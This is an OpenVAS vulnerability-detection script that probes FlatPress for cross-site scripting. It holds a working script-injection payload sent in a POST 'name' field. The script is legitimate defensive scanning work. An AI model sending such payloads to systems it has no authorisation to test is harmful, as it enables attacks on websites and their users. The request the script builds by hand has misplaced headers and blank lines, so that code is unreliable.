##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_flatpress_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# FlatPress Cross-Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected
  website.
  Impact Level: Application.";
tag_affected = "FlatPress version 0.1010.1 and prior";
tag_insight = "The flaw is due to input passed to 'name', 'email' and 'url' POST
  parameters in index.php are not properly sanitised before returning to the
  user.";
tag_solution = "Upgrade FlatPress 0.1010.2 or later,
  For updates refer to http://flatpress.org/home/";
tag_summary = "This host is running FlatPress and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_id(801947);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-13 17:31:13 +0200 (Wed, 13 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("FlatPress Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102807/flatpress010101-xss.txt");

  script_description(desc);
  script_summary("Check the XSS vulnerability in FlatPress");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach path (make_list("/blog","/FlatPress", cgi_dirs()))
{
  req = string("GET ", path, "/index.php", " HTTP/1.1\r\n",
               "Host: ", get_host_name(), "\r\n\r\n");
  rcvRes = http_send_recv(port:port, data:req);

  ## Confirm Application installation for each path
  if(">FlatPress<" >< rcvRes)
  {
    filename = string(path + "/index.php?x=entry:entry110603-123922;comments:1");
    authVariables = "name=%22%3E%3Cscript%3Ealert%28%22OpenVAS-XSS-TEST%22%" +
                    "29%3B%3C%2Fscript%3E";

    ## Construct XSS Request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", get_host_name(),"\r\n\r\n",
                    "User-Agent:  XSS-TEST\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n",
                     authVariables);
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

    ## Checking the response for exploit string
    if('><script>alert("OpenVAS-XSS-TEST");</script>' >< rcvRes)
    {
      security_warning(port);
      exit(0);
    }
  }
}
